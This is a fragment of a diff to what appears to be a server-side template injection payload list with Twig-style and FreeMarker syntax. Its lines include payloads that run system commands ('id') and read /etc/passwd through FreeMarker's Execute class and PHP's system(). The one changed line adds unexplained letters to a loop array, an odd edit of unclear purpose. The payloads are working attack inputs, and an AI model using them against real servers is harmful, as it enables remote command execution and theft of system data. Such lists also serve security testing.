@@ -7,7 +7,7 @@
 {{ phpinfo() }}
 {{ constant('PHP_OS') }}
 {{ system('id') }}
-{% for i in [1,2,3] %}{{ i }}{% endfor %}
+{% for i in [1,2,3,B,H,R,G,A,V,I] %}{{ i }}{% endfor %}
 ${7*7}aaaaa
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
